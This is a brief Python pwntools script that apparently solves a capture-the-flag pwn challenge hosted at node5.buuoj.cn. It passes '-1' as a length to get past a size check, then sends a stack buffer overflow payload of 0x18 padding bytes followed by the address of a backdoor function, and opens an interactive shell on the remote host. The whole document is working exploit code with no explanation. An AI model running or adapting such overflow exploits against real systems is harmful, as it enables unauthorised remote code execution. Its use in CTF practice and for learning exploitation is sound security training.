from pwn import *
io = remote('node5.buuoj.cn',27319)

backdoor = 0x0400726
payload = b'a' * 0x18 + p64(backdoor)

io.sendlineafter('name:','-1')
io.sendlineafter('name?',payload)
io.interactive()
